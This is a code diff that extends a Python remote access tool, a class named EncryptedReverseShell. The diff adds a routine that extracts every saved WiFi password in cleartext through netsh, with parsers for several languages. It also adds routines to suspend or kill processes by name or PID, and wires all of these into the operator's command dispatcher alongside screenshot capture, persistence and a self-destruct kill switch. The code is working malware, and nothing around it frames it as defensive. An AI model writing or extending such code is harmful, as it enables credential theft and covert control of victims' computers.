@@ -314,6 +314,281 @@ class EncryptedReverseShell:
         except Exception as e:
             return {"error": f"Shutdown failed: {str(e)}"}
 
+    def get_wifi_passwords(self):
+        """Get all saved WiFi passwords"""
+        try:
+            if platform.system() != "Windows":
+                return {"error": "WiFi password extraction is only supported on Windows"}
+            
+            # Get system encoding
+            system_encoding = self.get_system_encoding()
+            
+            # Get all WiFi profiles
+            result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], 
+                                  capture_output=True, timeout=10)
+            
+            if result.returncode != 0:
+                return {"error": "Failed to get WiFi profiles"}
+            
+            # Try to decode with system encoding
+            try:
+                output = result.stdout.decode(system_encoding, errors='replace')
+            except:
+                output = result.stdout.decode('utf-8', errors='replace')
+            
+            profiles = []
+            for line in output.split('\n'):
+                # Support multiple languages
+                if any(indicator in line for indicator in [
+                    "All User Profile",
+                    "Все профили пользователей",
+                    "Profil tous les utilisateurs",
+                    "Profil für alle Benutzer"
+                ]):
+                    if ":" in line:
+                        profile = line.split(":", 1)[1].strip()
+                        if profile:
+                            profiles.append(profile)
+            
+            # If no profiles found, try alternative parsing
+            if not profiles:
+                for line in output.split('\n'):
+                    line = line.strip()
+                    if line and not line.startswith('Profiles') and not line.startswith('Профили'):
+                        if ':' in line:
+                            potential_profile = line.split(':', 1)[1].strip()
+                            if potential_profile and len(potential_profile) > 1:
+                                # Verify it's a valid profile
+                                verify = subprocess.run(
+                                    ['netsh', 'wlan', 'show', 'profile', potential_profile],
+                                    capture_output=True,
+                                    timeout=5
+                                )
+                                if verify.returncode == 0:
+                                    profiles.append(potential_profile)
+            
+            if not profiles:
+                return {"error": "No WiFi profiles found"}
+            
+            wifi_passwords = []
+            for profile in profiles:
+                try:
+                    # Get password for each profile
+                    pwd_result = subprocess.run(
+                        ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'],
+                        capture_output=True,
+                        timeout=10
+                    )
+                    
+                    if pwd_result.returncode == 0:
+                        # Try multiple encodings for password output
+                        pwd_output = None
+                        for encoding in [system_encoding, 'utf-8', 'cp866', 'cp1251', 'windows-1251', 'latin-1']:
+                            try:
+                                pwd_output = pwd_result.stdout.decode(encoding, errors='replace')
+                                if 'Key Content' in pwd_output or 'Содержимое ключа' in pwd_output or 'Security key' in pwd_output:
+                                    break
+                            except:
+                                continue
+                        
+                        if pwd_output is None:
+                            try:
+                                pwd_output = pwd_result.stdout.decode('utf-8', errors='ignore')
+                            except:
+                                pwd_output = pwd_result.stdout.decode('latin-1', errors='ignore')
+                        
+                        password = "No password/Open network"
+                        
+                        # Key indicators in different languages
+                        key_indicators = [
+                            "Key Content",
+                            "Содержимое ключа", 
+                            "Schlüsselinhalt",
+                            "Contenu de la clé",
+                            "Contenido de la clave",
+                            "Contenuto chiave"
+                        ]
+                        
+                        # Find password in output
+                        for line in pwd_output.split('\n'):
+                            line_stripped = line.strip()
+                            for indicator in key_indicators:
+                                if indicator in line_stripped:
+                                    if ":" in line_stripped:
+                                        password = line_stripped.split(":", 1)[1].strip()
+                                        break
+                            if password != "No password/Open network":
+                                break
+                        
+                        # Check if network has security
+                        security_indicators = [
+                            "Security key",
+                            "Ключ безопасности",
+                            "Clé de sécurité",
+                            "Sicherheitsschlüssel"
+                        ]
+                        
+                        has_security = False
+                        for line in pwd_output.split('\n'):
+                            for indicator in security_indicators:
+                                if indicator in line and ("present" in line.lower() or "присутствует" in line.lower()):
+                                    has_security = True
+                                    break
+                            if has_security:
+                                break
+                        
+                        if not has_security and password == "No password/Open network":
+                            password = "Open network (no password)"
+                        
+                        wifi_passwords.append({
+                            "ssid": profile,
+                            "password": password
+                        })
+                    else:
+                        wifi_passwords.append({
+                            "ssid": profile,
+                            "password": "Error retrieving password"
+                        })
+                        
+                except Exception as e:
+                    wifi_passwords.append({
+                        "ssid": profile,
+                        "password": f"Error: {str(e)}"
+                    })
+            
+            if not wifi_passwords:
+                return {"error": "No WiFi networks found or unable to extract passwords"}
+            
+            return {
+                "wifi_passwords": wifi_passwords,
+                "total_networks": len(wifi_passwords)
+            }
+            
+        except Exception as e:
+            return {"error": f"WiFi password extraction failed: {str(e)}"}
+
+    def get_current_directory(self):
+        """Get current working directory"""
+        try:
+            current_dir = os.getcwd()
+            return {
+                "current_directory": current_dir,
+                "exists": os.path.exists(current_dir),
+                "is_directory": os.path.isdir(current_dir)
+            }
+        except Exception as e:
+            return {"error": f"Failed to get current directory: {str(e)}"}
+
+    def suspend_process(self, process_identifier):
+        """Suspend a process by name or PID"""
+        try:
+            target_pid = None
+            process_name = None
+            
+            # Check if process_identifier is a PID (numeric)
+            if isinstance(process_identifier, str) and process_identifier.isdigit():
+                target_pid = int(process_identifier)
+            else:
+                # Assume it's a process name
+                if isinstance(process_identifier, str):
+                    process_name = process_identifier
+                    if not process_name.lower().endswith('.exe') and platform.system() == "Windows":
+                        process_name += '.exe'
+                else:
+                    return {"error": "Invalid process identifier"}
+            
+            suspended_processes = []
+            
+            for proc in psutil.process_iter(['pid', 'name', 'status']):
+                try:
+                    # Match by PID or name
+                    if target_pid is not None and proc.info['pid'] == target_pid:
+                        process = psutil.Process(proc.info['pid'])
+                        process.suspend()
+                        suspended_processes.append({
+                            "pid": proc.info['pid'],
+                            "name": proc.info['name'],
+                            "action": "suspended"
+                        })
+                        break
+                    elif process_name is not None and proc.info['name'].lower() == process_name.lower():
+                        process = psutil.Process(proc.info['pid'])
+                        process.suspend()
+                        suspended_processes.append({
+                            "pid": proc.info['pid'],
+                            "name": proc.info['name'],
+                            "action": "suspended"
+                        })
+                except (psutil.NoSuchProcess, psutil.AccessDenied) as e:
+                    continue
+            
+            if suspended_processes:
+                return {
+                    "suspended_processes": suspended_processes,
+                    "total_suspended": len(suspended_processes)
+                }
+            else:
+                return {"error": f"No matching processes found for: {process_identifier}"}
+                
+        except Exception as e:
+            return {"error": f"Process suspension failed: {str(e)}"}
+
+    def kill_process(self, process_identifier):
+        """Kill a process by name or PID"""
+        try:
+            target_pid = None
+            process_name = None
+            
+            # Check if process_identifier is a PID (numeric)
+            if isinstance(process_identifier, str) and process_identifier.isdigit():
+                target_pid = int(process_identifier)
+            else:
+                # Assume it's a process name
+                if isinstance(process_identifier, str):
+                    process_name = process_identifier
+                    if not process_name.lower().endswith('.exe') and platform.system() == "Windows":
+                        process_name += '.exe'
+                else:
+                    return {"error": "Invalid process identifier"}
+            
+            killed_processes = []
+            
+            for proc in psutil.process_iter(['pid', 'name', 'status']):
+                try:
+                    # Match by PID or name
+                    if target_pid is not None and proc.info['pid'] == target_pid:
+                        process = psutil.Process(proc.info['pid'])
+                        process_name_result = proc.info['name']
+                        process.kill()
+                        killed_processes.append({
+                            "pid": proc.info['pid'],
+                            "name": process_name_result,
+                            "action": "killed"
+                        })
+                        break
+                    elif process_name is not None and proc.info['name'].lower() == process_name.lower():
+                        process = psutil.Process(proc.info['pid'])
+                        process_name_result = proc.info['name']
+                        process.kill()
+                        killed_processes.append({
+                            "pid": proc.info['pid'],
+                            "name": process_name_result,
+                            "action": "killed"
+                        })
+                except (psutil.NoSuchProcess, psutil.AccessDenied) as e:
+                    continue
+            
+            if killed_processes:
+                return {
+                    "killed_processes": killed_processes,
+                    "total_killed": len(killed_processes)
+                }
+            else:
+                return {"error": f"No matching processes found for: {process_identifier}"}
+                
+        except Exception as e:
+            return {"error": f"Process termination failed: {str(e)}"}
+
     def take_screenshot(self):
         try:
             screenshot = ImageGrab.grab()
@@ -903,6 +1178,24 @@ WantedBy=default.target
             
             elif cmd_type == "shutdown":
                 return {"shutdown_result": self.shutdown_system()}
+            
+            elif cmd_type == "wifi_passwords":
+                return {"wifi_result": self.get_wifi_passwords()}
+            
+            elif cmd_type == "pwd":
+                return {"pwd_result": self.get_current_directory()}
+            
+            elif cmd_type == "suspend":
+                if command:
+                    return {"suspend_result": self.suspend_process(command)}
+                else:
+                    return {"error": "Please specify process name or PID"}
+            
+            elif cmd_type == "kill_process":
+                if command:
+                    return {"kill_result": self.kill_process(command)}
+                else:
+                    return {"error": "Please specify process name or PID"}
             
             elif cmd_type == "kill_switch":
                 def delayed_destruction():
